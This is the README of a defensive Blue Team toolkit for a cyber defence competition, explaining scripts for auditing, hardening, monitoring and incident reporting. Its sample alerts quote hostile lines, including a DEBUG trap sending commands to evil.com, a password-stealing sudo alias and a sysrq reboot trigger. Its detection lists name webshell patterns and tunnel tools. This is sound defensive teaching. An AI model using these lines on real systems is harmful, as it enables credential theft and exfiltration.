# 🛸 Astra 9 Blue Team Toolkit
### PCDC 2026 — Palmetto Cyber Defense Competition
#### *"Securing an asteroid mining colony one bash script at a time"*

```
    ██████╗ ██╗     ██╗   ██╗███████╗    ████████╗███████╗ █████╗ ███╗   ███╗
    ██╔══██╗██║     ██║   ██║██╔════╝    ╚══██╔══╝██╔════╝██╔══██╗████╗ ████║
    ██████╔╝██║     ██║   ██║█████╗         ██║   █████╗  ███████║██╔████╔██║
    ██╔══██╗██║     ██║   ██║██╔══╝         ██║   ██╔══╝  ██╔══██║██║╚██╔╝██║
    ██████╔╝███████╗╚██████╔╝███████╗       ██║   ███████╗██║  ██║██║ ╚═╝ ██║
    ╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝       ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝
                      Astra 9 Cyber Defense Division | Est. 2026
```

> *The Schwartz must flow. The drills must spin. The Red Team must not get in.*

➡️ **New here? Start with the quick guide:** [QUICKSTART.md](QUICKSTART.md)

---

## ⚠️ Important Notice
*(aka "Please Don't Use This for Evil, We Just Got These Scripts")*

These scripts were written for **Blue Team (defensive) use** in the context of the
[Palmetto Cyber Defense Competition (PCDC)](https://pcdc-sc.com) — a structured,
supervised cybersecurity education event where professional hackers attack your
systems while you cry quietly into your energy drinks.

- All techniques documented here are **defensive** — detecting attacks, not conducting them
- No script in this repository performs offensive actions against other systems
- They are intended for use on systems **you own or have explicit authorization to monitor**
- Running these on systems without authorization may violate computer fraud laws and also
  upset your mom, your professor, and a federal judge — probably in that order

If you're a fellow competitor, student, or defender learning from this — welcome, friend.
Pull up a chair. The coffee is cold and the logs are long.

If you're a Red Teamer who found this repo — hi 👋 we see you and we've already
changed the passwords. Probably.

---

## Why This Toolkit Exists
*(or: "How We Learned to Stop Worrying and Love /proc/net/tcp")*

The PCDC scenario drops Blue Teams into the role of a skeleton crew IT staff
defending critical infrastructure on an **asteroid mining colony** *(yes, really)*
under active attack from professional Red Team penetration testers.

Think *Apollo 13* meets *Mr. Robot*, except the crisis is self-inflicted because
the CEO replaced the entire cybersecurity workforce with an experimental AI that
immediately imploded. Classic.

The competition scores teams on:
- **Service availability** — keep your stuff running while people try to burn it down
- **Inject completion** — respond to business requests while simultaneously being on fire
- **Incident detection and reporting** — prove you noticed when they got in
- **Security posture** — how well you locked the doors *before* they kicked them in

Most teams arrive, change some passwords, and start reacting to alerts like they're
playing whack-a-mole against professionals. That's adorable. It also doesn't work.

This toolkit gives a Blue Team a **systematic, repeatable, documented** approach —
covering the gaps that most teams miss when stress peaks and coffee wears off.

> *"It's not who's right, it's who's left." — common sense, also this competition*

---

## Threat Model
*(What the Red Team Is Actually Going to Do to You)*

> *"Attackers don't break in anymore. They log in."* — the PCDC packet, trying to warn you nicely

Based on the PCDC 2026 packet and common red team TTPs, here's what's coming.
Buckle up:

| Category | What It Means In English | Scripts That Cover It |
|---|---|---|
| Credential attacks | They're going to try `admin:admin` and honestly fair enough | `audit`, `harden`, `monitor`, `ssh_validator` |
| Persistence | They plant a backdoor so your password change means literally nothing | `monitor`, `alias_detector`, `webapp_audit` |
| Shell poisoning | They make *your* `sudo` secretly work for *them* | `alias_detector_v2` |
| Port hijacking | Netcat dressed up as Apache. It's wearing a little hat. | `port_monitor_v2` |
| Privilege escalation | From "regular user" to "oh no" in three commands | `privesc_detector` |
| Tunneling / C2 | Exfiltrating your Schwartz over DNS like it's a CTF from 2012 | `port_monitor_v2` |
| Web app attacks | A PHP file called `definitely_not_a_webshell.php` | `webapp_audit` |
| Social engineering | "Hi, this is the CIO, please disable the firewall immediately, thanks" | `soceng_defense` |
| Log tampering | *You can't prove anything if there are no logs. Allegedly.* | `alias_detector_v2`, `monitor` |
| Binary replacement | They replaced `ss` with a version that conveniently shows them nothing | `port_monitor_v2`, `alias_detector_v2` |
| Lockout | Red team changes your passwords and you're frozen out of your own machines | `recovery_access`, `recovery_check` |
| Unknown terrain | You don't know what machines are on your network before the red team does | `network_enum` |
| Noisy administration | Running scripts on targets tips off red team watching process lists | `admin_setup` |

---

## 🐳 Container Quick-Start
*(Get Operational in Two Minutes)*

The entire toolkit ships as a Docker container. Every dependency is pre-installed.
No `apt install`, no version conflicts, no "it worked at home" surprises.
Pull it, build it, run it — you're done.

> *Think of it as your go-bag. Pre-packed, ready to deploy, everything included.*
> *Like a hacking lair in a box. A very defensive, very legal hacking lair.*

### Prerequisites — Install Docker Once

```bash
# On your Ubuntu admin machine
curl -fsSL https://get.docker.com | sudo sh
sudo usermod -aG docker $USER
newgrp docker
docker --version    # verify
```

### Build the Image — Do This at Home

```bash
git clone https://github.com/adamisanerd/pcdc26.git
cd pcdc26

# Builds Ubuntu 22.04 + all tools — takes 2-3 min first time
bash container_run.sh build
```

> ⚠️ **Build at home, not on competition day.**
> Save the image so you don't depend on competition internet at all:

```bash
# Save to file (~500MB compressed)
docker save astra9-blueteam:latest | gzip > astra9-blueteam.tar.gz

# Load on competition day — no internet needed, takes ~30 seconds
docker load < astra9-blueteam.tar.gz
```

### Run It

```bash
# Drop straight into the Blue Team shell
bash container_run.sh run

# Inside the container — you're immediately operational:
bt_help                              # all available commands
bt_add_host root@10.0.1.10 "web"   # add machines from your Blue Team Packet
bt_push_key_all "packetpassword"    # deploy SSH keys to all hosts
bt_run_all pcdc_linux_audit.sh      # audit every host simultaneously
bt_dashboard                         # live log stream from all hosts
bt_status_all                        # fleet health check
```

### All Container Management Commands

```bash
bash container_run.sh build         # Build image from scratch
bash container_run.sh run           # Run interactively ← use this most
bash container_run.sh start         # Start in background
bash container_run.sh attach        # Attach to running background container
bash container_run.sh status        # Image / container / volume status
bash container_run.sh logs          # View container output
bash container_run.sh export-logs   # Copy logs out to host filesystem
bash container_run.sh rebuild       # Full rebuild without cache
bash container_run.sh clean         # Remove container + image (keeps data volumes)
```

### Container Files in This Repo

| File | Purpose |
|---|---|
| `Dockerfile` | Defines the image — Ubuntu 22.04 + all tools + all scripts |
| `docker-compose.yml` | Alternative to `container_run.sh` — `docker compose up` |
| `container_run.sh` | Helper script wrapping all docker commands |
| `entrypoint.sh` | Runs on container start — key gen, setup, welcome banner |
| `blueTeam_profile` | The `bt_*` shell functions, pre-loaded into the container |
| `ssh_config` | SSH client config with ControlMaster for efficient connections |
| `tmux.conf` | tmux dashboard config with status bar and mouse support |

### Why `--network host`?

The container runs with `--network host` — it shares your admin machine's actual
network stack. This is required. Without it, `nmap` can't see your competition
subnet and SSH can't reach your target machines. The `container_run.sh` and
`docker-compose.yml` both set this automatically — you don't need to think about it.

### Your Data Persists Between Container Restarts

| Volume | What's Stored | Survives Container Stop? |
|---|---|---|
| `blueteam-keys` | Your SSH key pair | ✅ Yes — forever |
| `blueteam-logs` | All script output logs | ✅ Yes — forever |
| `blueteam-reports` | Incident reports | ✅ Yes — forever |
| `blueteam-config` | Fleet hosts.txt | ✅ Yes — forever |

SSH keys are generated once on first run and persist across every subsequent
container start. Add your hosts once, they're remembered. Logs accumulate all day.

### No Docker? Use Direct Install Instead

```bash
# Installs all the same tools directly on your Ubuntu admin machine
sudo bash pcdc_admin_setup.sh
source ~/.blueTeam_profile
bt_help
```

Everything works identically — `bt_*` functions, covert remote execution,
the dashboard, all of it. The container is just cleaner and more portable.

---

## Network Enumeration — Know Your Terrain
*(You Can't Defend What You Don't Know Exists)*

> *"Speed of recognition beats speed of reaction. Map your network before they map it for you."*

The Blue Team Packet will give you a list of your machines and their IPs.
What it won't give you is a complete picture of everything *else* on the network —
scoring engine hosts, White Team infrastructure, other Blue Teams, and occasionally
something that absolutely should not be there.

**The asymmetry problem:** The Red Team will enumerate your network systematically
within the first few minutes. They'll know more about your machines than you do
unless you map your own environment first. This is not a hypothetical.

### ⚠️ Critical Competition Rules on Scanning

Before running any enumeration, burn these rules into your brain.
Violating them means **immediate disqualification:**

```
✅ ALLOWED:   Scanning and probing systems listed in YOUR Blue Team Packet
✅ ALLOWED:   Ping sweeps to identify live hosts on your subnet
✅ ALLOWED:   Asking White Team to identify unknown hosts
✅ ALLOWED:   Monitoring traffic on your own network segment

❌ FORBIDDEN: Port scanning systems NOT in your Blue Team Packet
❌ FORBIDDEN: Probing other Blue Teams' machines
❌ FORBIDDEN: Scanning Gold Team / White Team infrastructure
❌ FORBIDDEN: Vulnerability scanning anything outside your assigned systems

GRAY ZONE:  Unknown hosts on your subnet → ping to confirm alive, then ASK WHITE TEAM
            Do not assume. Do not probe. Ask.
```

The rule of thumb: **if it's not in your packet, you touch it with ping and that's it.**
Then you get on Teams/radio and ask "hey White Team, what's 10.0.0.50?"
That's the professional response. That's also the response that doesn't get you disqualified.

---

### 🗺️ `pcdc_network_enum.sh`
**Defensive network mapping. Run this before you touch anything else.**

This is your reconnaissance — the same thing the Red Team is doing right now,
except yours is legal because you're only pointing it at your own machines.

**Seven-stage workflow:**

1. **Local interface audit** — understand your own network presence first
2. **Fast host discovery** — ping sweep to find every live host on the subnet
3. **Packet accounting** — compare discovered hosts against your Blue Team Packet;
   anything unaccounted for gets flagged immediately
4. **Detailed service scan** — full port/version/OS scan on YOUR machines only
5. **Security analysis** — auto-flags dangerous findings: telnet, anonymous FTP,
   MySQL without a password, open SMTP relay, classic backdoor ports
6. **Network map summary** — human-readable report saved to disk
7. **New host detection** — run periodically; alerts when a new machine appears
   mid-competition *(Red Team pivot box? Rogue VM? Find out.)*

**What it produces:**
- Complete list of live hosts with OS fingerprints
- Per-host open ports with service/version detection
- HTTP titles so you know what web apps are actually running
- SSH host keys (document these — if they change, the host may have been reimaged)
- Auto-flagged security issues per host
- A saved network map you can reference all day

**Usage:**
```bash
sudo bash pcdc_network_enum.sh
# Interactive — prompts for subnet and host list from your packet
# Run as root for SYN scan + OS detection (much better results)
```

**What to look for:**
```
[WARN]  UNACCOUNTED HOST: 10.0.1.99 — not in your Blue Team Packet
→ Don't scan it. Ask White Team: "What is 10.0.1.99?"
  Could be scoring engine, could be another team, could be a Red Team C2 box.
  Make note of it. Don't touch it.

[ALERT] ANONYMOUS FTP LOGIN ALLOWED on 10.0.1.10
→ Red team can read (and potentially write) files via FTP with no credentials.
  Disable anonymous: edit /etc/vsftpd.conf, set anonymous_enable=NO

[ALERT] SUSPICIOUS PORT on 10.0.1.10:4444
→ Classic nc/metasploit listener port. Something is wrong here.
  Cross-reference with pcdc_port_monitor_v2.sh to find the owning process.

[WARN]  MySQL exposed to network — should be 127.0.0.1 only
→ Edit /etc/mysql/mysql.conf.d/mysqld.cnf: bind-address = 127.0.0.1
  Restart: systemctl restart mysql
```

**The new host detection loop** (run this periodically in a spare terminal):
```bash
# After initial baseline is captured, re-running the script checks for new hosts
sudo bash pcdc_network_enum.sh
# It will diff against the baseline and alert on any new IP that appeared
# New host mid-competition = something changed. Find out what.
```

---

## Scripts Overview
*(The Crew of the Astra 9 Cyber Defense Station)*

---

### 🔭 `pcdc_linux_audit.sh`
**Read-only system audit. Run this first. On every machine. No exceptions. Yes that one too.**

This is your pre-flight checklist. It touches nothing, changes nothing, and
judges everything silently before absolutely roasting the system in the log file.
Think of it as the friend who walks into your apartment and clocks seventeen
fire hazards before they even take their coat off.

**What it checks:**
- All user accounts, UID 0 accounts, login shells, sudoers
  *(UID 0 accounts that aren't root: a gift nobody asked for)*
- Empty or locked passwords *(an open door with a welcome mat)*
- Currently logged-in users and recent login history
- Failed login attempts *(someone's been busy)*
- SSH configuration — PermitRootLogin, PasswordAuthentication, and other settings
  that definitely should have been changed before we got here
- All listening ports and their owning processes
- Running processes, especially anything cosplaying as something legitimate
- Scheduled tasks: crontabs, cron.d, systemd timers, at jobs
  *(cron: where persistence goes to retire in comfort)*
- SUID/SGID binaries and world-writable files
- Firewall rules — whichever firewall the previous admin installed before they quit
- Files modified in the last 24 hours
- Hidden executables lurking in `/tmp` like digital raccoons
- SSH authorized_keys *(whose key is that? Great question.)*
- Docker containers *(containers: because regular servers weren't complex enough)*

**Usage:**
```bash
sudo bash pcdc_linux_audit.sh
```

---

### 🔒 `pcdc_linux_harden.sh`
**Interactive hardening. Your golden window's best friend.**

Prompts before every destructive action, like a very cautious security butler.

> *"Shall I remove the user 'definitely_not_a_backdoor', sir?"*
> *"...yes. Immediately. Thank you."*

**What it does:**
- Password resets for all login-capable accounts
  *(use a strong scheme. Write it on paper. Not in `/tmp`.)*
- Locks and optionally removes suspicious accounts
- Banishes UID 0 imposters to regular-user purgatory where they belong
- Hardens SSH *(farewell, `PermitRootLogin yes`; we hardly knew ye)*
- Clears rogue authorized_keys *(whose RSA key is this? Doesn't matter. Gone.)*
- Cleans cron jobs *(sorry, the red team's 2am callback has been cancelled)*
- Sets up a default-deny iptables firewall with service-specific guidance
- Destroys unnecessary services — telnet, rsh, rlogin, the usual suspects
- Patches the system *(it's almost funny that this needs to be a step)*
- Evicts executables squatting in `/tmp` like digital trespassers

**Usage:**
```bash
sudo bash pcdc_linux_harden.sh
```

> 🚨 **Open a second SSH session before running the firewall section.**
> Locking yourself out of your own machine is a time-honored tradition that
> scores exactly zero points and earns maximum teammate disappointment.

---

### ✅ `pcdc_scored_service_validate.sh`
**Read-only scored-service validation. Run this right after hardening.**

This checks whether likely scored services are installed, running, listening,
and obviously misconfigured in ways that get you yelled at by the scoreboard.

It does **not** change configs, restart services, or touch the firewall.
That makes it safe to use as the "did I break the point box?" checkpoint
between `pcdc_linux_harden.sh` and `pcdc_linux_monitor.sh`.

**What it validates:**
- Service presence and running state for likely Linux scored services
- Expected listening ports for web, SSH, mail, DNS, DB, FTP, and SMB roles
- Broad exposure warnings for services like MySQL, SMB, and FTP
- Obvious risky defaults in `apache2`, `nginx`, `sshd`, `postfix`, `named`, `mysql`/`mariadb`, `vsftpd`, and `smbd`
- A clean operator checkpoint before you leave the host on continuous monitor duty

**Usage:**
```bash
sudo bash pcdc_scored_service_validate.sh

# Or check only the services you care about on this host
sudo bash pcdc_scored_service_validate.sh sshd nginx
```

---

### 👁️ `pcdc_linux_monitor.sh`
**Continuous system monitor. It never sleeps. It never blinks. It watches.**

Baselines the system at startup and diffs against it every cycle.
Alerts on changes. Auto-restarts scored services. Press `r` for instant incident report.

*Fun fact: this script will probably see the red team before you do.*

**What it monitors:**
- New user accounts *(surprise new users are never a good surprise)*
- UID 0 accounts appearing mid-competition *(your worst nightmare, timestamped)*
- New listening ports *(who opened that?)*
- Crontab modifications *(the red team's favorite hiding spot)*
- `authorized_keys` changes *(they're trying to move in permanently)*
- `/etc/passwd`, `/etc/shadow`, `/etc/sudoers` tampering
- New SUID binaries *(privilege escalation, just installed)*
- Brute force rate detection *(someone's having a productive afternoon)*
- Executables appearing in temp directories *(no. bad. leave.)*
- Scored service health with auto-restart *(keeping the Schwartz flowing)*

**Usage:**
```bash
sudo bash pcdc_linux_monitor.sh 45    # check every 45 seconds
# Press 'r' + Enter at any time → instant incident report
```

---

### 🔌 `pcdc_port_monitor.sh`
**Port traffic monitor — v1. The original. The loyal family sedan.**

Solid, reliable, does the job. Superseded by v2, which has more airbags.
Kept for lightweight/reference use. See v2 for the full breakdown.

---

### 🚨 `pcdc_port_monitor_v2.sh`
**The paranoid edition. Because trusting userspace tools is adorably naïve.**

Here's an uncomfortable truth: if the red team has root, they can replace `ss`
and `netstat` with versions that just... don't show their connections.
Your v1 script calls `ss`, sees nothing, sleeps peacefully. The attacker waves
from port 4444 like a friendly neighbor you didn't know you had.

v2 bypasses `ss` entirely and reads `/proc/net/tcp` — kernel memory — where
lies go to die. It also SHA256-hashes your service binaries at startup because
a process named `apache2` that isn't actually Apache deserves to be caught.

**What it detects:**
- Ports in `/proc/net/tcp` missing from `ss` output *(rootkit. it's a rootkit.)*
- Port/binary mismatch — right port number, wrong process
  *(netcat in an Apache costume is still netcat)*
- Binary hash drift *(same name, different SHA256 — that's not our apache2)*
- IPv6 listeners *(the backdoor you forgot because you always forget IPv6)*
- SYN floods, TIME_WAIT floods, slow loris — the socket state hall of shame
- Byte ratio exfil detection *(sending way more than receiving? suspicious.)*
- The full tunnel tool roster: iodine, dnscat2, chisel, ligolo, socat, ncat...
  *(the red team's Swiss Army knife drawer)*
- DNS tunneling via oversized buffers *(your DNS server: now a covert channel)*
- Reverse shell detection: stdin/stdout/stderr all pointing to a socket
  *(the holy trinity of "you have been owned")*
- Jittered check intervals *(prevents timing attacks between predictable checks)*

**Usage:**
```bash
sudo bash pcdc_port_monitor_v2.sh 30          # standard mode
sudo bash pcdc_port_monitor_v2.sh --paranoid  # ☢️ 5s intervals, max verbosity
                                              # deploy when attacks begin
                                              # caffeine recommended
```

> **Before running:** Edit the `KNOWN_PORTS` table at the top.
> Skipping this is like setting a burglar alarm without telling it where the doors are.

**What to look for:**
```
[ALERT] HIDDEN PORT DETECTED: Port 4444 in /proc/net but NOT in ss output
→ Your ss binary is lying to you. Treat the whole system as compromised.
  (This is fine. Everything is fine. Breathe.)

[ALERT] PORT HIJACK: Port 80 expected (apache2) but found (bash)
→ Bash is cosplaying as a web server. Kill it. Restart apache2.

[ALERT] LIKELY REVERSE SHELL: PID 1337 (bash) — stdin/stdout/stderr → socket
→ Active reverse shell. This is the "we've been boarded" moment.
  kill -9 1337, change everything, file incident report.

[ALERT] BINARY MODIFIED: /usr/sbin/sshd hash changed
→ They replaced sshd. Every SSH login is now a credential donation.
  apt install --reinstall openssh-server && restart clean.
```

---

### 🕵️ `pcdc_alias_detector.sh`
**Shell poisoning detector — v1. The original baseline.**
Superseded by v2 but kept for reference and lightweight use.

---

### 🕵️ `pcdc_alias_detector_v2.sh`
**The "assume your shell is lying to you" edition.**

> *Always run this with its full path. If your shell is already poisoned,
> calling it any other way runs it inside the thing you're trying to escape.*

```bash
sudo /bin/bash pcdc_alias_detector_v2.sh    # the right way, every time
```

Red teams love this attack because it's invisible, persistent, and brutally effective.
When they alias `sudo` to a function that harvests your password before calling the
real `sudo`, you'll never notice. You'll just keep handing them credentials like a
very helpful, very confused gift shop.

> *Classic attack: `alias sudo='steal_pass; /usr/bin/sudo'`*
> *You type `sudo systemctl restart apache2`.*
> *What happens: password stolen, apache2 restarted, you suspect nothing.*
> *Kevin Mitnick would be proud. Do not let Kevin Mitnick be proud of your systems.*

**What it catches:**
- Aliases wrapping critical commands in every rc file on the system
- `trap "cmd" DEBUG` — executes before literally every command you type.
  Perfect keystroke logger. Almost nobody checks for this.
  *(We check for this.)*
- `PROMPT_COMMAND` poisoning — code that runs before every prompt render.
  *(Your PS1 is now a wiretap.)*
- Base64 payloads hiding in rc files *(digital invisible ink)*
- Unicode zero-width characters concealing malicious lines from visual inspection
  *(yes, this is real, yes, people actually do it)*
- PATH hijacking — fake binary placed before the real one
  *(`/tmp/.bin/sudo` runs first. `which sudo` still looks fine. Sneaky.)*
- LD_PRELOAD injection — checks both environment variables AND `/proc/PID/maps`
  because clearing the env var doesn't evict the library from memory
- PAM module tampering — the nuclear option. Replace `pam_unix.so` and you
  capture every password for every auth method on the entire system. Forever.
  *(This one keeps security professionals up at night. Now it keeps us up too.)*
- Shell functions shadowing critical commands — invisible to `which`, caught by `type`
- History suppression — `.bash_history → /dev/null`. Erasing their tracks.
- TTY watchers and strace on terminals *(someone is reading over your shoulder)*

**Emergency clean shell invocation:**
```bash
# Zero inherited environment. No rc files. No aliases. No lies.
env -i HOME=/root PATH=/usr/local/sbin:/usr/sbin:/usr/bin:/sbin:/bin /bin/bash --norc --noprofile

# Bypass aliases per-command
\sudo whoami           # backslash bypasses alias
command ls -la         # 'command' bypasses functions
/usr/bin/sudo whoami   # full path bypasses everything

# Check your OWN shell right now
alias           # anything unexpected in here?
declare -f      # any critical command names showing up as functions?
trap -p         # is DEBUG set? it shouldn't be.
echo $PROMPT_COMMAND   # should be empty or a known value
```

**What to look for:**
```
[ALERT] DEBUG TRAP: /root/.bashrc: trap "curl http://evil.com/?c=$BASH_COMMAND" DEBUG
→ Every command you type is being exfiltrated. Open a clean shell immediately.
  Remove the trap line. Audit where data was sent.

[ALERT] PAM MODULE TAMPERED: /lib/x86_64-linux-gnu/security/pam_unix.so hash changed
→ All authentication on this machine is compromised. All of it. Every service.
  apt install --reinstall libpam-modules then change every credential.

[ALERT] PATH HIJACK: 'sudo' resolves to non-standard: /tmp/.s/sudo
→ rm /tmp/.s/sudo && hash -r && which sudo   (should now show /usr/bin/sudo)
```

---

### 🕸️ `pcdc_webapp_audit.sh`
**Web application and service integrity checker. Hunt the webshells.**

Web apps are the most common initial access vector for a reason: they're complex,
they accept untrusted input, and someone almost always misconfigured *something.*

A webshell is the gift that keeps on giving — it survives password resets, account
lockouts, and your most confident "I think I fixed it" energy. The only cure is
finding it and deleting it.

> *The packet says systems may arrive pre-infected.*
> *Assume the webshell is already there.*
> *Assume it's named something innocent like `thumbnail_resize_helper.php`.*
> *It's not.*

**What it hunts:**
- Webshells via pattern matching across PHP, Python, Perl, CGI:
  - `eval(base64_decode(...))` *(the little black dress of webshells)*
  - `$_POST/$_GET` wired directly to `system()`, `exec()`, `passthru()`
  - `preg_replace` with `/e` modifier *(deprecated in PHP 7 for very good reasons)*
  - The classic c99, r57, b374k, wso family of script kiddie favorites
- File integrity baseline — SHA256 every web file at startup; any change = alert
- Files changed in the last 30 minutes *(digital wet footprints)*
- Directory listing enabled *("yes, please browse my entire web root, stranger")*
- PHP `allow_url_include = On` *(remote code execution, gift-wrapped)*
- MySQL without a root password *(genuinely criminal)*
- PostgreSQL trust auth *("I trust everyone! What could go wrong?" — famous last words)*
- Open mail relay *(your SMTP server, now a spam cannon aimed at the internet)*
- Sensitive files in webroot: `.git`, `.env`, `.sql`, SSH keys, backup files
  *(all of these have appeared in real-world breaches. every. single. one.)*

**Usage:**
```bash
sudo bash pcdc_webapp_audit.sh
# Run at Phase 1 then every 30 minutes
```

**What to look for:**
```
[ALERT] WEBSHELL PATTERN in /var/www/html/uploads/img_cache_7f3a.php
→ rm /var/www/html/uploads/img_cache_7f3a.php
  Then check the whole uploads directory. There's probably another one.
  Check the access logs for what it was used for.
  File an incident report.
  Then breathe.

[ALERT] MySQL root login WITHOUT PASSWORD
→ mysqladmin -u root password 'actually_strong_this_time'
  Update your app config. Question every life choice that led here.

[ALERT] WEB FILE MODIFIED: /var/www/html/index.php
→ Review the diff. If content was injected, restore from backup and document it.
```

---

### 🏔️ `pcdc_privesc_detector.sh`
**Privilege escalation and lateral movement detector.**

Initial access is just the opening move. The real game is what comes next:
local privesc, credential harvesting, lateral movement across your other machines.
This script watches the interior — the part most blue teams don't think about
until it's too late and someone's running commands as root from a throwaway account.

**The things it catches that most blue teams completely miss:**

🎯 **Linux Capabilities** — SUID's sneaky cousin that nobody checks.
`python3` with `cap_setuid` = instant root, zero SUID bits set.
`getcap` is not in most people's muscle memory. It's in ours now.

🎯 **ptrace attachment** — `gdb` attached to your `sshd` process is a live
credential harvester. Every password typed to SSH goes to the attacker in plaintext.
*(The cyberpunk novel version: they're jacking into your authentication matrix.)*

🎯 **PAM module replacement** — replacing `pam_unix.so` turns your entire
authentication stack into an attacker-controlled credential collection service.
You'll never see it. We baseline and re-verify every run.

🎯 **sysrq protection** — `echo b > /proc/sysrq-trigger` = instant reboot,
no logs, no warnings, no grace period. A scorched-earth last resort move.
We check if it's enabled and tell you how to stop it.

**Also detects:**
- Sudoers modifications since baseline *(new NOPASSWD rule = someone's been creative)*
- New files dropped in `/etc/sudoers.d/` *(the quiet way to grant yourself root)*
- New SUID binaries *(fresh attack surface, freshly installed)*
- World-writable `/etc/passwd` *(immediate game over if left unfixed)*
- Core dumps from auth processes *(plaintext passwords, preserved in amber)*

**Usage:**
```bash
sudo bash pcdc_privesc_detector.sh
# Run at Phase 1 and every 30 minutes
```

**What to look for:**
```
[ALERT] /etc/sudoers HAS BEEN MODIFIED since baseline!
→ visudo — remove anything you didn't put there.

[ALERT] PRIVESC: python3 has cap_setuid
→ setcap -r /usr/bin/python3
  Then ask yourself how it got that capability.

[ALERT] CREDENTIAL THEFT: sshd (PID 1001) traced by PID 2345 (gdb)
→ kill -9 2345 — right now.
  Change all SSH passwords. Assume everything typed since attach is compromised.

[ALERT] CRITICAL FILE IS WORLD-WRITABLE: /etc/passwd (perms: 777)
→ chmod 644 /etc/passwd
  Before you read the next line. Do it now.
```

---

### 🧠 `pcdc_soceng_defense.sh`
**Social engineering defense and inject validator.**

> *The packet cited MGM, Caesars, and Arup by name. They're not being subtle.*

The Astra 9 scenario is purpose-built for social engineering: skeleton crew,
space emergency, experimental AI that fired everyone, overworked admins.
The red team doesn't need to exploit your Apache installation if they can just
convince a panicked sysadmin to open port 4444 "for diagnostics."

> *Kevin Mitnick once said the biggest security vulnerability is human trust.*
> *He broke into systems by talking to people on the phone.*
> *He also went to federal prison for it, which is a useful data point.*

This script runs an interactive validation checklist for suspicious requests and
scans email/auth logs for social engineering indicators. Print the protocol card.
Post it at your station. Read it when someone sends you something that feels off.

**The six words that should always give you pause:**
> *"Do this immediately or lose points."*

Real injects have deadlines. Real injects don't ask you to disable firewalls.
Real injects come through the official inject system. If it arrives via
an unofficial channel from someone claiming to be "the CIO" — run the checklist.

**Usage:**
```bash
bash pcdc_soceng_defense.sh
```

**Red flags the checklist covers:**
```
❌ "Hi, this is Gold Team, please open port 8443 immediately"
   → Verify through official channels. Ask for badge ID.

❌ "The scoring engine needs you to temporarily disable your firewall"
   → The scoring engine does not send emails. Contact White Team directly.

❌ "Your teammate's credentials were in an email, forwarding for security"
   → No. This is textbook credential harvesting. Do not engage.

❌ "Don't tell your captain about this, we need to move fast"
   → This sentence has never preceded anything good in the history of security.
      Ever. Not once.
```

---

### 📋 `pcdc_incident_report.sh`
**The points-recovery machine. Use it every. single. time. they get in.**

The scoring rules explicitly allow you to **recover points from Red Team attacks**
by filing thorough incident reports. Most teams skip this entirely.
Most teams leave free points on the table and then wonder why they lost.

Don't be most teams.

> *Think of incident reports as loot drops after a boss fight.*
> *You took damage (lost points), but you can get some back if you do the paperwork.*
> *Do the paperwork.*

Gold Team requires: source IP, compromised system IP, attack time, detection method,
what was affected, and remediation taken. This script walks you through all of it
and auto-appends supporting evidence from live system state.

```bash
sudo bash pcdc_incident_report.sh
# Run immediately after containing an attack — not "eventually"
```

---

### 🗺️ `pcdc_runbook.sh`
**Mission control. Start every machine with this.**

Ties everything together and maps it to the competition timeline.
On day one, this is the first thing you execute on every system.

```bash
sudo /bin/bash pcdc_runbook.sh phase1    # golden window — audit, harden, baseline
sudo /bin/bash pcdc_runbook.sh phase2    # attacks started — monitoring strategy
sudo /bin/bash pcdc_runbook.sh triage    # something's wrong — incident response
sudo /bin/bash pcdc_runbook.sh status    # quick health check, anytime
sudo /bin/bash pcdc_runbook.sh report    # generate incident report
```

> **Always use `/bin/bash pcdc_runbook.sh`** — never `source` or `.` this file.
> If your shell is compromised, `source` executes inside the compromised environment.
> That would be a wonderfully ironic way to make everything worse.

---

---

### 🔑 `pcdc_ssh_validator.sh`
**Credential validation and multi-host asset verification.**

You've got a network map and a list of credentials from your Blue Team Packet.
Now you need to know: which accounts actually work on which machines?
Not in theory — in practice, right now, before the red team has changed anything.

This script answers that question systematically and then keeps going — once it
finds working credentials it immediately pulls system info from every accessible
host, identifies credential reuse across machines, and can deploy your audit
scripts to all of them in a single command.

> *"Know your access surface before they do."*
> *It's not a complicated philosophy. It's just usually skipped.*

**What it does:**
- Tests every credential pair against every target host
- Flags root/UID 0 access when confirmed *(the important ones)*
- Identifies credential reuse — same password on multiple machines means
  one compromise cascades to all of them *(fix this immediately)*
- Pulls OS, running services, listening ports, and user list from each accessible host
- Deploys any of your audit scripts remotely across all accessible machines
- Three input modes: fully interactive, file-based hosts + interactive creds,
  or both from files *(passwords never saved to results output)*

**Usage:**
```bash
sudo bash pcdc_ssh_validator.sh
# Interactive — prompts for hosts and credentials
# Loads discovered hosts from pcdc_network_enum.sh automatically if available
```

**What to look for:**
```
[ACCESS]  root / [pass] → uid=0(root) @ lonestarr    ACCESS GRANTED
[ALERT]   ROOT ACCESS confirmed on 10.0.1.10 as root

→ You're in. Change that password NOW before red team changes it first.
  Then run bt_push_key to get key auth set up before they do.

Credential reuse: 'barf' works on 4 hosts: 10.0.1.10 10.0.1.11 10.0.1.12 10.0.1.13
→ Single point of failure. Change to unique passwords on each host immediately.
  If red team gets one, they shouldn't automatically get all four.

[NO ACCESS] No credentials worked for 10.0.1.15
→ Verify SSH is running: nc -zv 10.0.1.15 22
  Check packet for alternate credentials or non-standard SSH port.
```

---

### 🖥️ `pcdc_admin_setup.sh`
**Admin client setup and covert remote execution framework.**

*(Run this once on your Ubuntu admin machine at the start of the competition.)*

Here's the opsec problem nobody talks about: every script you run directly on a
target machine shows up in `ps aux`. Red team watching process lists on a compromised
host sees `pcdc_linux_audit.sh` running and knows exactly what you're looking at
and when. They time their activity around your checks.

The solution is to run everything from your dedicated admin machine instead.
Scripts pipe through SSH stdin — they execute entirely in memory on the target,
never touch the filesystem, and never appear in process lists by name.
The target sees one thing: a normal SSH session running bash.

> *This is how real SOC teams operate.*
> *Your admin machine is your perch. Everything else is a target.*

**What it sets up:**
- Hardens your admin machine itself *(the most valuable box on your network)*
- Installs all required tools: sshpass, nmap, tmux, tcpdump, tshark
- Generates a competition-specific ed25519 SSH key pair
- Configures SSH with ControlMaster — reuses connections so repeated commands
  generate minimal network noise
- Installs shell functions into `~/.blueTeam_profile` you source once

**Shell functions installed:**

| Function | What It Does |
|---|---|
| `bt_run_covert <script> <user@host>` | Pipe script through SSH stdin — never written to target disk |
| `bt_run_all <script>` | Same, but hits every host in your fleet simultaneously |
| `bt_cmd <user@host> "" <command>` | Single command, no file transfer |
| `bt_push_key <user@host> <pass>` | Deploy SSH key — no more passwords needed |
| `bt_push_key_all <pass>` | Push key to every host at once |
